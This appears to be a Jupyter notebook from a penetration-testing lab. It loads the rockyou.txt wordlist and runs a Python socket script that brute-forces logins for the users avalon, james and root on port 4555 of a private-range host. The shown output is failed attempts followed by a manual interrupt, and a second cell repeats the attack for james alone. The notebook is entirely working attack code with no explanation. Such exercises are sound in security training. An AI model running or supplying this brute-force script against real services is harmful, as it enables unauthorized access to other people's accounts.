{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ca9ae747-089f-4cc3-8b77-a3e357b612f7",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "14344392"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "f = open('/usr/share/wordlists/rockyou.txt' ,'r', encoding='latin-1')\n",
    "\n",
    "lines = f.readlines()\n",
    "\n",
    "len(lines)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "8ff10594-b1c1-440a-9f66-0e3fdedd2280",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FAILED 0 Login failed for avalon\n",
      "\n",
      "FAILED 0 Login failed for james\n",
      "\n",
      "FAILED 0 Login failed for root\n",
      "\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_7689/37539150.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     22\u001b[0m                 \u001b[0;32mpass\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     23\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 24\u001b[0;31m         \u001b[0mfirst\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1024\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'ascii'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     25\u001b[0m         \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mbytes\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"james\\r\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"latin-1\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     26\u001b[0m         \u001b[0msecond\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1024\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'ascii'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "import socket, time, sys,random\n",
    "\n",
    "timeout = 5\n",
    "ip = \"10.11.1.95\"\n",
    "port = 4555\n",
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "    s.settimeout(timeout)\n",
    "    s.connect((ip, port))\n",
    "    \n",
    "    for idx, line in enumerate(lines):\n",
    "        first = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(\"avalon\\r\", \"latin-1\"))\n",
    "        second = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(line, \"latin-1\"))\n",
    "        result = s.recv(1024).decode('ascii')\n",
    "        if not 'failed' in result:\n",
    "            print(\"avalon\", line, result)\n",
    "        else:\n",
    "            if idx % 100 == 0:\n",
    "                print(\"FAILED\", idx, result)\n",
    "            else:\n",
    "                pass\n",
    "            \n",
    "        first = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(\"james\\r\", \"latin-1\"))\n",
    "        second = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(line, \"latin-1\"))\n",
    "        result = s.recv(1024).decode('ascii')\n",
    "        if not 'failed' in result:\n",
    "            print(\"james\", line, result)\n",
    "        else:\n",
    "            if idx % 100 == 0:\n",
    "                print(\"FAILED\", idx, result)\n",
    "            else:\n",
    "                pass\n",
    "            \n",
    "        first = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(\"root\\r\", \"latin-1\"))\n",
    "        second = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(line, \"latin-1\"))\n",
    "        result = s.recv(1024).decode('ascii')\n",
    "        if not 'failed' in result:\n",
    "            print(\"root\", line, result)\n",
    "        else:\n",
    "            if idx % 100 == 0:\n",
    "                print(\"FAILED\", idx, result)\n",
    "            else:\n",
    "                pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cab3f447-f73a-4d3f-87f8-9c4ec69e1b33",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket, time, sys,random\n",
    "\n",
    "timeout = 5\n",
    "ip = \"10.11.1.95\"\n",
    "port = 4555\n",
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "    s.settimeout(timeout)\n",
    "    s.connect((ip, port))\n",
    "    \n",
    "    for line in lines:\n",
    "        first = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(\"james\\n\", \"latin-1\"))\n",
    "        second = s.recv(1024).decode('ascii')\n",
    "        s.send(bytes(line, \"latin-1\"))\n",
    "        result = s.recv(1024).decode('ascii')\n",
    "        if not 'failed' in result:\n",
    "            print(line, result)\n",
    "        else:\n",
    "            if random.random() < .1:\n",
    "                print(\"FAILED\", line, result)\n",
    "            else:\n",
    "                pass\n",
    "            "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d36abe1e-f860-4b70-84c9-912a1433546c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
